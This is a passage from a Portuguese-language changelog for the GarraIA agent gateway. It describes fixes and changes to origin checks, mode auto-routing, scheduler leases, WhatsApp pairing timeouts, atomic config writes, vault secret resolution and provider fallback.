  navegador e no handshake do chat (`/ws`), porque o nome nao atravessa a ancora
  anti-DNS-rebinding (no reverse proxy, alem disso, o proxy termina TLS e o gateway por
  baixo fala `http`, entao o esquema da origem nao bate). A correcao e de uma linha de
  config: liste a origem em `gateway.allowed_origins` (`https://garraia.seudominio.com`,
  `http://nas.local:3888`) — uma origem declarada ali e aceita como tal, incluindo o
  esquema, e destrava CORS, guarda e WebSocket de uma vez. Acesso por IP ou `localhost`
  nao precisa de nada. Ver `docs/hardening-gateway.md`. O perfil default (loopback, sem
  chave), que e a esmagadora maioria das instalacoes, nao muda.
- **O auto-router de modo passa a valer em todos os pontos de entrada
  (#1223).** O roteador do GAR-227 — heuristica primeiro, LLM curto depois —
  ja existia e funcionava, mas estava ligado em um lugar so: o shim OpenAI do
  gateway. `garra chat`, `POST /api/chat`, o WebSocket do webchat, o app mobile
  e os treze canais (Telegram, Discord, Slack, WhatsApp, Signal, Matrix,
  iMessage, IRC, Line, Google Chat, Teams, OpenClaw) nunca classificavam nada:
  a sessao sem modo escolhido seguia sem modo, e o trabalho do roteador so
  aparecia para quem entrava pela porta que quase ninguem usa.
  A classificacao passou para um unico ponto de estrangulamento,
  `AppState::exec_context_for_msg`, que so age quando as tres condicoes valem
  ao mesmo tempo: a sessao nao tem modo escolhido, a flag
  `agent.auto_router_llm_enabled` esta ligada, e ha texto de mensagem. O
  `exec_context_for` antigo continua existindo e delega com `text: None`, entao
  os caminhos sem mensagem disponivel (a2a, entre outros) nao mudam.
  O contrato do GAR-227 fica intacto no ponto que mais importa: o modo deduzido
  e persistido com `set_agent_mode_auto`, aparece no `/mode` e **nao** liga a
  ToolPolicy do #988. Deduzir nao e consentir — um modo que o sistema adivinhou
  nao concede tool nenhuma que o usuario nao tenha concedido.
  Com a flag desligada, que segue sendo o default, o comportamento e byte a
  byte o de antes; ha teste de regressao afirmando exatamente isso.
- As quatro copias do loop de turno do `AgentRuntime` agora despacham tools
  por uma unica funcao (`dispatch_tool_call`): orcamento, deteccao de loop,
  gate do modo (#988), eventos de ciclo de vida, timeout e pausa de
  confirmacao vivem num lugar so (#1226, slice S-A).
- **`DbRunLedger` passa a aceitar o `Arc<tokio::sync::Mutex<SessionStore>>` que o
  gateway ja guarda (#1227).** O adapter do ledger de runs exigia
  `std::sync::Mutex`, enquanto o `AppState` do gateway guarda o `SessionStore`
  atras do mutex do tokio - tipos incompativeis, entao o wiring era impossivel
  sem um segundo store so para o ledger. O trait `RunLedger` vira `async` (via
  `async_trait`, a mesma excecao documentada de `garraia_storage::ObjectStore`:
  e consumido como `dyn`), `NoopLedger` e `DbRunLedger` acompanham, e
  `SubAgentConfig` ganha `session_id` (builder `with_session_id`), que o
  `spawn_agent` repassa ao `on_start` - antes o run nascia sempre com
  `session_id = NULL`. Continua sem chamador de producao: o adapter agora e
  utilizavel, mas nenhum caminho do gateway/CLI constroi um `AgentCoordinator`,
  e o wiring na subida segue sendo a #1227.
- A rustdoc do `RunLedger`/`DbRunLedger` nao afirma mais que o gateway/CLI
  injetam o adapter: o wiring de producao (subida chamando
  `mark_interrupted_runs`, scheduler gravando run) e a #1227 e ainda nao
  existe. O fragmento da #1224 ja dizia a verdade; os doc comments agora
  dizem a mesma coisa.
- **Scheduler reivindica tarefas sob lease; re-poll apos queda e explicito e
  logado (#1227 slice 2).** O `run_scheduler` lia as tarefas vencidas com um
  `SELECT` puro e so mudava o status ao terminar — uma queda no meio do turno
  deixava a linha `pending`, e o tick seguinte (60 s) reexecutava a mesma
  tarefa EM SILENCIO, com mensagem de sistema duplicada no canal. Agora o
  tick passa por `claim_due_tasks`: numa transacao `BEGIN IMMEDIATE`, cada
  tarefa vencida vira `status = 'running'` com `lease_until = now + 600 s` e
  `leased_by = <uuid do processo>`, e so as linhas que ESTE chamador de fato
  virou (`UPDATE ... WHERE status = 'pending'`, contando `changes()`) sao
  devolvidas — dois schedulers sobre o mesmo arquivo nunca levam a mesma
  tarefa. `recover_expired_leases` devolve a `pending` toda tarefa `running`
  cuja lease passou (ou que ficou `running` sem lease) e a DEVOLVE ao
  chamador; `log_recovered_leases` grava `warn!` com id, `attempts` e
  `execute_at` — nunca `payload` (PII) — e roda na subida do gateway, ao lado
  de `log_interrupted_runs`, e no inicio de cada tick. Os terminais
  (`complete_task`, `fail_task`, `retry_or_fail_task`, `complete_recurring_run`)
  limpam a lease; o retry e o pulo de ocorrencia recorrente tambem devolvem o
  status a `pending`, o que antes nao precisavam fazer. Migration forward-only
  no `run_migrations` do `SessionStore`: colunas `lease_until TEXT` e
  `leased_by TEXT` em `scheduled_tasks`, com `ALTER TABLE` guardado por
  `pragma_table_info` (falha real sobe como erro em vez de virar coluna
  ausente), mais indice parcial `idx_tasks_lease`. `poll_due_tasks` continua
  existindo como leitura pura, documentado como tal. Teste de varredura fixa
  que `run_scheduler` usa `claim_due_tasks` e nao `poll_due_tasks`, e que a
  recuperacao roda nos dois lugares.
- **Todas as crates do workspace passam a declarar a MSRV (#1228).** Apenas 3
  das 23 crates herdavam `rust-version` do `[workspace.package]`; nas outras 20
  o cargo nao tinha como recusar um toolchain velho, e o erro so aparecia no
  meio da compilacao, atribuido a uma crate qualquer. Agora `garraia-glob`,
  `garraia-runtime` e `garraia-tools` trazem `rust-version = "1.95"` literal
  (elas ainda nao herdam nada do workspace: tem `version` e `edition`
  proprios, e migrar a heranca inteira mudaria os dois junto) e as demais usam
  `rust-version.workspace = true`. Nao ha `rust-toolchain.toml` de proposito:
  o CI roda lint e teste em `stable` e so o job de MSRV roda `cargo check` no
  piso, entao pinar 1.95 na arvore deixaria o `cargo clippy` local vermelho
  numa `main` verde.
- **O formato dos fragmentos de `changelog.d/` virou gate de CI (#1228).** O
  `assemble.py --check` existia desde sempre e so rodava se alguem lembrasse;
  uma auditoria achou 4 de 6 PRs abertas sem fragmento nenhum. Como as notas
  de release saem do `CHANGELOG.md` e nao da lista de commits, o silencio so
  aparecia no dia da release. O job novo tambem roda os testes do proprio
  `assemble.py` e dos parsers do quality ratchet — em invocacoes separadas,
  porque as duas suites trazem um pacote `tests` homonimo e uma chamada unica
  quebra na coleta. A checagem de *presenca* de fragmento fica para uma fatia
  propria, que precisa de label de escape e de periodo em observacao.
- **O roster no `.claude/agents/team-coordinator.md` estava defasado (#1228).**
  A tabela listava deepseek, glm e gpt e afirmava que a independencia de
  julgamento vinha de o Reviewer usar um modelo diferente do Implementer. O
  roster e Claude desde 2026-09-14 e a independencia vem do contexto separado
  (agente, prompt e worktree distintos, com o Reviewer lendo o diff e nunca o
  relatorio do Implementer) — como `skills/assemble-team.md` e o `CLAUDE.md` ja
  diziam. As duas skills de orquestracao ganharam uma secao de pre-requisitos
  dizendo que sem ferramenta de spawn de subagente o R4 nao e mergeavel por
  construcao, e o que fazer nesse caso.
- **Quem muta a arvore trabalha em worktree propria (#1228).** `code-reviewer` e
  `test-engineer` passam a dizer isso explicitamente. Uma mutacao aplicada e
  restaurada numa worktree compartilhada apareceu, para o Implementer que
  trabalhava nela, como edicao nao-commitada desativando a maquina de estados:
  ele parou, reverteu para a versao auditada e reportou — comportamento certo,
  arranjo errado. Junto, `assemble-team.md` ganha o gate que faltava em R4: o
  `security-auditor` pede o controle e o `code-reviewer` **muta o controle**,
  provando que sua remocao fica vermelha. O caso que motivou: uma auditoria R4
  exigiu `env_clear()` no spawn do filho e a allowlist de ambiente, os dois
  foram aplicados, e apagar o `env_clear()` depois deixava 93 de 93 testes
  verdes — o teste afirmava o conteudo de duas constantes, nunca que o
  ambiente era limpo.
- **O comentario do Quality Ratchet passa a dizer o que mudou NESTA PR, nao so
  vs baseline (#1254).** Como o comparador so olhava `.quality/baseline.json`
  (congelado em 2026-05-05), toda PR recebia o mesmo texto — a #1235 foi
  acusada de `files_over_700` 34 → 36 sem ter tocado em nada. `compare.py`
  ganha `--base <merge-base-metrics.json>`: com ele cada linha da tabela traz a
  coluna `Δ nesta PR` (current menos merge-base) e o relatorio abre com o
  veredito `Sem regressao nova nesta PR` ou `REGRESSAO NOVA nesta PR: <metrica>
  <delta>`, listando so o que piorou dentro da propria PR; a comparacao contra
  o baseline continua, rotulada `vs baseline (<data>) — ver #1254`, e cada
  regressao dela diz se e nova, pre-existente no merge-base ou nao mensuravel
  la (metrica nao coletada no base — a cobertura no CI, cujo `lcov.info` so
  existe no checkout da PR); nesse terceiro caso o veredito e ⚠️, nao ✅,
  porque o relatorio nao afirma pre-existencia do que nunca mediu. O
  `quality-ratchet.yml` coleta as metricas do `pull_request.base.sha` num
  worktree separado (`GARRAIA_REPO_ROOT=/tmp/base`, com os parsers da propria
  PR) e passa `--base` so em `pull_request`; em `push` para `main` o relatorio
  e byte-identico ao de antes. Exit code nao muda: `report-only` segue sempre 0
  e `enforce` segue decidido so pelo baseline. Quando `frozenAt` do baseline
  esta a mais de 90 dias de `collected_at` do current — calculo sobre os dois
  campos, sem relogio, deterministico — entra a linha WARN `baseline_age_days`
  apontando a #1254. O `baseline.json` nao foi tocado: re-baseline continua
  sendo decisao do dono.
- A documentacao descreve a precedencia real do bind do gateway: `--host`/
  `--port` explicitos > `HOST`/`PORT` de ambiente > defaults `127.0.0.1:3888`,
  e as chaves `gateway.host`/`gateway.port` do arquivo de config NAO alimentam
  o `garra start` (medido na v0.4.2). `docs/auth-config.md` ganhou a secao 5.1
  com a cadeia e as consequencias para `config check`; os trechos de
  `docs/installation.md` e `docs/deployment-runpod.md` que tratavam o valor do
  arquivo como governante do bind foram corrigidos (#1261).

### Deprecated
- **`ToolRegistry::execute_program` (`garraia-tools`) marcada `#[deprecated]`
  (#1226).** A funcao entrou pela #1224 como primeiro passo do Code Mode, mas
  ficou onde o runtime nao alcanca: `garraia-tools` nao e dependencia do
  `AgentRuntime`, a funcao nao consulta o `ToolGate` dos modos e nao tem
  nenhum chamador fora dos proprios testes da crate. Deixa-la publica sem
  aviso convidava alguem a liga-la ao loop por fora do gate — exatamente o
  caminho que a #1226 quer fechar. O atributo (`since = "0.4.3"`, a versao do
  trem GarraIA, nao a da crate) aponta para a substituta: a `tool_program`
  intrinseca do `AgentRuntime`, com gate por passo, que e a #1226 S-B. Nada
  foi removido nesta fatia; os testes seguem exercitando a funcao sob
  `#[allow(deprecated)]`.

### Fixed
- **Stream que quebra no meio agora refaz o turno em vez de matar ele (#1176).**
  `stream read error: error decoding response body` (upstream de provider free
  cortando o corpo, rede movel) matava o turno de primeira: sem retry, sem
  fallback, so a mensagem de erro no canal. Quando nada tinha ido ao sink
  ainda, o turno agora refaz uma vez pelo caminho batch (mesmo redo do
  #1048), que tem retry/fallback de verdade. Com texto ja entregue ao
  usuario, o erro original continua chegando — reenviar duplicaria o que ja
  apareceu no canal.
- **Garra Mobile deixa o icone padrao do template Flutter e passa a usar a
  marca do app, o lobo neon (#1177).** O APK era instalado com o logotipo do
  Flutter porque os `mipmap-*/ic_launcher.png` nunca tinham sido trocados.
  Agora o launcher mostra o mesmo WolfMark do header da home e da splash
  (`lib/widgets/brand/wolf_mark.dart`) como icone adaptativo (API 26+, fundo
  `garra_icon_bg` + frente dentro da zona segura de 66 dp), com camada
  monochrome para os themed icons do Android 13+, `roundIcon` e PNGs legados
  para API < 26 em todas as densidades. Os assets sao gerados por
  `apps/garraia-mobile/tool/gen_launcher_icons.py`, que reproduz a geometria
  do `_WolfPainter` de forma deterministica — rodar o script de novo nao
  produz diff. O papagaio de `assets/logo.png` continua sendo a marca do CLI,
  do desktop e do site.
- **`/pair` volta a funcionar — em todos os 11 canais, nao so no Telegram
  (#1189).** O comando gerava o codigo de 6 digitos em `state.pairing`, mas
  cada bootstrap de canal montava um `PairingManager` proprio, e era nessa
  instancia local que o handler de mensagens chamava `claim()`. A tabela
  local estava sempre vazia: o `claim()` devolvia `None`, o usuario caia em
  `telegram: unauthorized user ...` e a mensagem era descartada, mesmo com o
  codigo enviado dentro da janela de 5 minutos. O mesmo copy-paste duplicava
  a `Allowlist`: duas instancias liam o MESMO `allowlist.json` e ambas
  gravavam nele em `add()`/`claim_owner()`, entao uma sobrescrevia o owner ou
  o usuario recem-pareado da outra — perda de escrita silenciosa em disco.
  Agora os dois gates saem de um unico lugar, `channel_gates(state)`, que
  entrega as instancias do `AppState` compartilhadas por `/pair`, pelo
  handler de mensagens e pelo handler de voz. Telegram, Slack, Discord,
  WhatsApp, Signal, Matrix, IRC, LINE, Teams, Google Chat e iMessage estavam
  afetados pela duplicacao da allowlist; o `/pair` sem efeito era o do
  Telegram (o unico que passa pelo `commands.rs`) — no Discord, cujo `/pair`
  local gerava e resgatava na mesma instancia, o pareamento ja funcionava, e
  os outros nove canais nunca puderam emitir `/pair`. Mudanca de
  comportamento a registrar: com um `PairingManager` so por processo, um
  codigo gerado pelo `/pair` passa a ser resgatavel em **qualquer** canal
  habilitado (coerente com a allowlist global, que sempre foi um
  `allowlist.json` so); a protecao contra forca bruta no `claim()` e o aviso
  de queima ao dono estao no #1191.
- **Testes de PDF do `garraia-media` voltam a rodar (#1208).** Cinco testes
  estavam `#[ignore]`d desde 2026-04-15, atribuidos a "lopdf version drift".
  A causa era outra: a fixture `create_test_pdf` escrevia bytes de PDF na mao
  com offsets de `xref` errados, e esses bytes nao carregam em nenhuma versao
  do lopdf. Toda fixture passa a sair do writer do proprio lopdf, que ja era
  usado pelo teste de smoke. `test_extract_page_range_invalid` passava **pelo
  motivo errado** — como a fixture nao carregava, o erro vinha do
  `Document::load` e a validacao de faixa nunca era alcancada — e agora
  exercita a validacao de verdade. A assercao tautologica de
  `test_extract_metadata` (`title.is_none() || title.is_some()`) deu lugar a
  duas assercoes reais, incluindo a primeira cobertura de um PDF com `/Info`
  preenchido. De 16 passed / 6 ignored para 22 passed / 1 ignored.
- **Deteccao de formato de imagem por magic bytes volta a ser testada (#1209).**
  `test_detect_format_from_bytes` estava `#[ignore]`d desde 2026-04-15,
  atribuido a drift do crate `image`. A funcao nem usa esse crate: e comparacao
  de magic bytes pura, com um piso de 12 bytes que existe porque o ramo do WEBP
  le `data[8..12]`. As fixtures do teste tinham 8 e 4 bytes, caiam no piso e
  voltavam "unknown". Com cabecalhos reais de 12 bytes o teste volta a rodar, e
  os ramos GIF, WEBP e BMP — que nunca tiveram cobertura — passam a ser
  exercitados, junto com o caso RIFF/WAVE, que e a unica condicao composta da
  funcao. Um teste novo fixa o piso de 12 bytes como comportamento deliberado.
  O codigo de producao nao muda.
- **O contexto de projeto do `garra chat` para de gastar prompt com `target/` e
  passa a dizer que projeto e em que ramo (#1219).** O `scan_directory_context`
  listava qualquer entrada do topo do diretorio, entao `target/`,
  `node_modules/` e `dist/` entravam no system prompt de todo turno — tokens
  pagos para informar ao modelo que o projeto tem um diretorio de build. Pior
  que o desperdicio era o que faltava: o resumo nao dizia **qual** projeto era
  (so marcadores genericos tipo "Rust project") nem **em que ramo** o agente
  estava, embora o painel `/contexto` ja mostrasse o ramo na tela ao lado.
  Agora doze diretorios de build e dependencia sao filtrados da listagem, o
  nome do projeto sai do primeiro heading do `README.md` e o ramo vem do mesmo
  `ui::git_branch` que o painel `/contexto` usa — leitura direta de `HEAD`, sem
  spawnar `git` e sem varrer a arvore, entao worktree e submodulo continuam
  resolvendo certo. O filtro so descarta o que e **diretorio**: um arquivo
  chamado `build` ou `coverage` segue aparecendo, que e o caso em que o nome
  carrega informacao de verdade.
  A composicao do resumo passou a ser por partes juntadas com `|`, porque com
  quatro campos opcionais a concatenacao antiga deixava separador orfao toda
  vez que um deles vinha vazio.
- **Suite de integracao S3 volta a exercitar um MinIO de verdade (#1230).**
  Os 8 testes de `crates/garraia-storage/tests/s3_integration.rs` fechavam
  verdes em milissegundos sem asserir nada: `minio/minio`, a imagem que
  `testcontainers-modules` 0.15 fixa, foi removida do Docker Hub por inteiro
  (o registry responde "object not found" para o repositorio, nao so para a
  tag), entao `start_minio()` sempre caia no branch de skip silencioso. O
  teste agora aponta para `quay.io/minio/minio` na mesma tag
  (`RELEASE.2025-02-28T09-55-16Z`) via `ImageExt::with_name`/`with_tag` —
  mesma imagem, mesmo conteudo, so troca o registry. O step `storage-s3` do
  CI liga `GARRAIA_REQUIRE_DOCKER=1`, que o teste ja honrava: dali em diante
  um verde nesse step so acontece se o container realmente subir e o
  round-trip rodar contra ele.
- **MCP: referencias `vault:` no `env` de servidores do config.yml/mcp.json
  nao eram resolvidas no boot** (#1237). A resolucao de `vault:` vivia so no
  registry (`McpPersistenceService::load_registry`, GAR-291), e o caminho de
  boot (`ConfigLoader::merged_mcp_config` -> `build_mcp_tools`) copiava o
  mapa `env` como estava: o filho recebia a string literal como valor da
  variavel — o operador acreditava que o segredo estava cifrado, e o
  servidor falhava de forma enganosa. Agora o boot resolve com o MESMO
  helper do registry (`resolver_env_com_vault`), e a politica e **fail-
  closed**: referencia que nao resolve (cofre ausente, `GARRAIA_VAULT_`
  `PASSPHRASE` sem set, chave inexistente) impede o servidor de subir, com
  aviso nomeando servidor e chave, nunca o valor — sem pending de proposito,
  porque o pending guardaria o env literal e um retry bem-sucedido entregaria
  a string crua ao filho. O `garra config check` passa a avisar quando ha
  `vault:` no `env` de um servidor MCP com o cofre indisponivel (config
  mergeada: config.yml + mcp.json). Docs voltam a recomendar `vault:` no
  `env` (`mcp-capacidades`, `config.basic.yml`, threat-model E). Teste de
  integracao com o fixture `--expose-env` prova o valor resolvido chegando
  ao filho e o servidor bloqueado sem valor no texto; a mutacao desligando
  a resolucao derruba o teste.
- **`ConfigLoader::save` passou a ser atomica, e um `config.yml` vazio deixou de
  virar defaults (#1238).** A escrita era `std::fs::write` — truncate-then-write
  — com o aperto de permissao (`0600`) rodando **depois**: havia uma janela em
  que `llm.*.api_key` e `gateway.api_key` estavam no disco sob o modo do umask,
  e uma queda no meio deixava o arquivo pela metade ou vazio. Agora e tmp no
  mesmo diretorio, nascido `0600` via `OpenOptionsExt::mode`, `sync_all`,
  `rename` e `fsync` do diretorio — o mesmo padrao que o store de sessao do
  `whatsapp_linked` ja usava, ate no nome do temporario. Ele nao e mais
  `.config.yml.tmp`: com dois escritores (ver abaixo) os dois calculavam o
  MESMO caminho e o abriam com `O_TRUNC`, de modo que a construcao vendida
  como conserto anti-corrida tinha uma corrida propria — tmp com fragmentos
  dos dois, renomeado por cima da config. Agora o sufixo e aleatorio e a
  abertura e `create_new`, que tambem recusa seguir symlink plantado no
  caminho. E o temporario e apagado em qualquer falha a partir do
  ponto em que ele e **nosso** — e so a partir dali: apagar um temporario que
  o `create_new` acabou de recusar destruiria o arquivo do outro escritor,
  que e exatamente o que o `create_new` existe para evitar.
  O par disso: `ConfigLoader::load` **recusa** um `config.yml` sem conteudo —
  em branco, ou so com comentarios — em vez de devolver `AppConfig::default()`
  com sucesso. Era o pior dos tres estados —
  o gate de credencial do gateway desaparecia em silencio e o `save()` seguinte
  gravava os defaults por cima da config do usuario.
  A janela deixou de ser teorica nesta fatia: alem da CLI (`garra whatsapp
  link`/`logout`), o gateway passou a chamar `set_channel_enabled` sozinho
  quando o servidor invalida a sessao — dois escritores, sem lock.
- **`garra whatsapp link` e `garra whatsapp cloud` num pipe deixam de devolver
  o comando que voce acabou de rodar (#1238).** Sem terminal, os tres comandos
  imprimiam o MESMO texto, byte a byte — e esse texto termina mandando rodar
  `garra whatsapp link`. Medido no binario: o `diff` entre as saidas de
  `whatsapp`, `whatsapp link` e `whatsapp cloud` era vazio, e os tres saiam 0.
  Quem conecta um GarraIA headless com `ssh servidor 'garra whatsapp link'`
  caia num ciclo fechado: sem QR, sem erro, e com um exit code afirmando que
  tinha dado certo. Agora quem JA escolheu o fluxo recebe o motivo (o QR se le
  deste terminal e o consentimento se da nele), a saida (`ssh -t <usuario>@
  <maquina> garra whatsapp link`) e exit 69 `EX_UNAVAILABLE` em vez de 0. O
  `garra whatsapp` sem escolha continua saindo 0 com as duas opcoes: ali o
  hint E a resposta, nao uma repeticao.
- **`garra whatsapp link` deixa de exibir uma linha congelada enquanto a ponte
  esta muda (#1238).** O `→ conectando ao WhatsApp…` era impresso uma vez, na
  troca de fase, e o contador regressivo so roda nas fases que ja tem QR na
  tela. Medido com o Baileys real (7.0.0-rc14) num container que nao alcanca
  os servidores do WhatsApp: `status connecting` aos 2 s e **nada** por 85 s.
  Ou seja, ate dois minutos de linha estatica antes de o teto de
  `no_progress_after_secs` encerrar com a mensagem certa. Nao era infinito,
  mas nao era feedback. Agora um pulso a cada 5 s diz ha quanto tempo esta
  tentando e em quantos segundos desiste — e o prazo anunciado e o MESMO
  relogio que de fato encerra, com teste afirmando a soma. O
  `PairUi::connecting` entrou **sem implementacao default**: uma UI nova tem
  de decidir o que mostrar, porque herdar silencio em silencio foi exatamente
  o defeito.
- **`garra whatsapp` nao fica mais em "conectando ao WhatsApp…" para sempre
  quando a ponte fala e nunca progride (#1238).** O prazo de silencio da
  revisao anterior conta desde o ULTIMO evento e zera a qualquer um deles,
  inclusive os que significam "falhei de novo". A ponte reconecta sozinha, sem
  teto, emitindo `disconnected` e `status` a cada rodada de backoff — no
  maximo a cada 30 s, sempre abaixo dos 90 s do prazo. Resultado: o prazo
  existia, funcionava, e nunca disparava, porque o proprio fracasso o
  realimentava. Quem caia nisso era o usuario sem internet, atras de portal de
  autenticacao de wi-fi, com a porta 443 bloqueada ou com o relogio do sistema
  errado: a tela parava em duas linhas e so o Ctrl+C saia. Agora cada queda
  aparece na tela com o motivo e o prazo da proxima tentativa, e existe um
  segundo teto — 120 s de TEMPO SEM PROGRESSO, que **nao zera com evento** —
  para o caso de o pareamento nao andar; ele diz o que verificar e manda rodar
  o comando de novo. Quem renova esse teto e a FASE do pareamento: enquanto
  houver QR na tela ele nao corre, e por isso o usuario lento para pegar o
  celular nao e cortado (quem limita esse caso e o teto de 5 QRs). Um QR que
  expira sem substituto volta a arma-lo.
- **Um unico QR nao desarma mais os tetos do pareamento para sempre
  (#1238).** Com a rede caindo logo DEPOIS de o QR aparecer, os tres relogios
  do comando ficavam desligados ao mesmo tempo: o de silencio porque cada
  tentativa fracassada o realimenta; o de QR porque, expirado aquele, a
  maquina estaciona num estado onde nao ha mais nada a expirar; e o de
  progresso porque ele era um booleano de "ja progrediu alguma vez" que o
  primeiro QR ligava e nada desligava. Com os prazos de producao o comando nao
  terminava nunca — so o Ctrl+C saia. O booleano virou um relogio de
  progresso medido pela fase do pareamento.
- **O pareamento que autentica e nunca conecta tambem tem teto agora
  (#1238).** O relogio de progresso da revisao anterior era renovado enquanto
  o pareamento PERMANECIA numa fase que anda — e permanecer e justamente o que
  permite estacionar. Bastava a fase "autenticado", que nao expira sozinha e
  nao sai com uma queda, para o comando rodar para sempre: e o caminho real do
  WhatsApp, em que logo depois de o usuario escanear o servidor pede para
  reiniciar a conexao e a reconexao nunca fecha (portal de autenticacao que
  caiu depois do scan, porta 443 intermitente). Agora o relogio so e renovado
  quando o pareamento chega MAIS LONGE do que ja esteve, e como esse avanco e
  monotono o numero de renovacoes e finito: nenhuma fase, e nenhum ciclo de
  fases, escapa. Isso fecha tambem o caso de uma ponte que conecta, cai e
  conecta de novo sem parar, que renovava o relogio a cada volta. Um teste
  enumera todas as fases e nao compila se alguem acrescentar uma sem dizer
  qual e o teto dela.
- **O modo `serve` desiste quando a ponte fala sem nunca conectar (#1238).**
  E o mesmo problema do lado do daemon: o prazo do laco de eventos conta desde
  o ultimo evento, e uma ponte que reconecta sozinha o realimenta a cada
  tentativa fracassada. O canal ficava preso numa execucao que tentava para
  sempre e o backoff de reconexao nunca chegava a rodar — sem ninguem olhando
  um terminal. Agora ha um teto de tempo falando sem conectar, e estoura-lo
  entrega o caso ao backoff que ja existia.
- **O modo `serve` do gateway ganhou prazo onde o `pair` ja tinha (#1238).**
  A espera pelo fim do processo filho, o envio de comando para ele e a espera
  pelo PROXIMO EVENTO rodavam sem relogio: uma ponte que fecha a saida sem
  terminar, que para de ler o proprio stdin, ou que sobe e emudece sem
  conectar pendurava a task do canal em vez de cair no backoff de reconexao
  que existe logo acima. O prazo do laco de eventos vale so antes de conectar:
  depois disso o silencio e o estado normal de uma conta sem mensagens.
- **O `shutdown` de cortesia deixou de poder pendurar a saida (#1238).** Ele e
  o ultimo recurso de todo caminho de desistencia, o do Ctrl+C inclusive, e
  rodava sem prazo — mas escrever no stdin do filho bloqueia assim que o
  buffer do pipe enche e o filho para de ler. Agora ele tem 500 ms e desiste:
  o que se espera ali e uma linha curta num pipe saudavel, e quem nao
  respondeu nesse tempo nao vai responder.
- **A linha de "nova tentativa em Ns" deixou de prometer prazo ja vencido
  (#1238).** Ela truncava a divisao, entao um backoff de 1500 ms aparecia como
  "1s" e a linha ficava vencida meio segundo depois. Junto disso a faixa de
  500 a 999 ms mudou de aparencia: antes ela caia no generico "tentando de
  novo", e agora arredonda para cima e anuncia "1s".
- **`garra whatsapp restore` deixou de ligar o canal sem provar que a sessao
  restaurada abre (#1238).** Restaurar move bytes; nao decifra nada. Com a
  `session.key` perdida ou a passphrase do cofre trocada, o comando dizia
  "Sessao restaurada", gravava `enabled = true` e saia 0 — e o gateway passava
  a pagar timeout e retry a cada boot, que e exatamente o que a ordem
  blob-antes-de-enabled existe para evitar. Agora ele abre o blob ANTES de
  mover o arquivo e, se nao abrir, diz o que aconteceu e deixa o arquivado
  exatamente onde estava. A ordem importa: provando depois do movimento, uma
  passphrase do cofre apenas ausente do ambiente — quem a exporta e rodou num
  shell sem ela — consumia o `.prev` e recebia o conselho de ler um QR novo,
  que descartaria uma sessao intacta.
- **`npm ci` estourando o prazo nao deixa mais um processo orfao (#1238).**
  Depois dos 600 s o filho era largado rodando, mexendo no mesmo
  `node_modules` que a tentativa seguinte ia recriar.
- **`garra whatsapp` nao fica mais pendurado num bridge que sobe e nao fala
  (#1238).** O prazo de silencio, o contador do QR e o braco de Ctrl+C so
  comecavam DEPOIS do handshake com a ponte: `expect_started` e os dois
  comandos de abertura rodavam sem relogio e sem cancelamento. Um `node` da
  PATH que trava antes de rodar o bridge — shim de asdf, volta, nvm ou
  corepack baixando versao, stub de snap esperando confirmacao, wrapper que le
  stdin — deixava a tela parada nas instrucoes do QR para sempre, e nem o
  primeiro nem o segundo Ctrl+C faziam nada, porque o comando ja havia trocado
  o SIGINT default do sistema por um canal que ninguem estava lendo. A unica
  saida era `kill -9`, e ai o `Drop` que devolve a sessao arquivada nao rodava:
  num re-vinculo, a sessao boa ficava presa em `session.enc.prev`. Agora cada
  etapa anterior ao laco tem prazo e tem o cancelamento em primeiro lugar, o
  comando diz que o bridge nao respondeu e sugere conferir `node --version`, e
  uma linha de status sai antes do handshake para a tela nunca ficar muda. O
  mesmo tratamento vale para o modo `serve` do gateway, onde um handshake sem
  resposta pendurava o boot em vez de cair no backoff que existe para isso.
- **`docs/voice.md` documentava um provider de TTS e uma chave de config que nunca existiram.** A pagina
  mostrava `tts_provider: openai` com `tts_voice: "alloy"`; o `server.rs` so casa `hibiki` e `lmstudio`,
  e qualquer outro valor cai em silencio no Chatterbox — `VoiceConfig` nao tem campo `tts_voice`. A secao
  passa a documentar o provider `lmstudio` (servidor compativel com `POST /v1/audio/speech`), traz a tabela
  dos tres valores que fazem alguma coisa e diz que o resto vira Chatterbox sem aviso. `CLAUDE.md` e
  `ROADMAP.md` atribuiam ElevenLabs e Kokoro a crate `garraia-voice`: os adaptadores vivem em
  `garraia-channels::voice_channel`, atras da feature `voice` que nenhuma crate do workspace liga, e nao
  chegam ao gateway.
- **Prosas do repo deixam de afirmar um gate de boot que nao existe.** O
  `garra config check` so e invocado por dois comandos opt-in
  (`garra config check` e `garra doctor`) — nada no caminho de boot do
  gateway roda o `run_check`, entao um `Severity::Error` na config nao
  impede o gateway de subir. Duas prosas afirmavam o contrario: o
  doc-comment do `spawn_hardware_adapters` ("mostra os mesmos erros de
  config antes do boot") e o comentario do teto de risco das automacoes
  ("o `garra config check` ja recusa R3+ antes do boot") foram reescritos
  para descrever o comando pelo que ele e (report opt-in) e a camada viva
  de verdade (o teto invalido cai no default r1 no boot). A entrada de
  `allowed_origins: ["*"]` no threat model tambem cita o check como
  "Validacao" — virou "Report (opt-in)". Varredura do repo por afirmacoes
  de gate nao achou mais nenhum ponto falso; os demais usos do comando na
  doc ja o descrevem como validacao de leitura.
- `SessionStore::validate_session_token` deixou de montar a clausula de idle
  via `format!` (regra 5): o timeout agora entra por bind (`'+' || ?2 ||
  ' seconds'`, coercao nativa do SQLite) e um teste varre o fonte para o
  padrao nao voltar, com teste de regressao do timeout positivo (#1247).
- **Rede caida nao acionava o fallback para o provider local** (#1249). A
  classificacao de retry casava texto de erro (`429`, `5xx`, `upstream`) e
  falha de transporte (`connection refused`, DNS, timeout de conexao) nao casa
  com padrao nenhum — o turno morria em `Err(e) => return Err(e)` ANTES do
  laco de fallback, nos caminhos batch e streaming: usuario tira o cabo e
  recebe erro em vez do Ollama que ja roda na maquina (ADR 0022, local-first).
  Agora existe a variante tipada `Error::Transport`, construida no ponto onde
  o `reqwest::Error` ainda existe como tipo (`providers::erro_de_envio`,
  chamado nos quatro providers — openai, anthropic, ollama, llama_cpp — e nos
  dois bracos, batch e streaming de cada um); o runtime classifica pela CLASSE
  e nao pela frase (`is_transport_error`). Transporte gasta **uma** tentativa
  e cai direto para o fallback, sem queimar o orcamento de retry (insistir 4x
  num endereco inalcancavel queimava ~3,5s de backoff); o breaker recebe a
  falha do mesmo jeito. 429/5xx continua no comportamento historico (retry
  com backoff no mesmo endereco). Testes com tempo virtual (`test-util`)
  provam a contagem de tentativas nos dois caminhos e o turno completo pelo
  fallback local.
- O codigo `#[cfg(windows)]` sob a feature `mcp` (wrapper `cmd /c` do
  `manager.rs`) agora compila no CI: um step Windows-only no job matrix roda
  `cargo check -p garraia-agents --features mcp --all-targets`, onde a
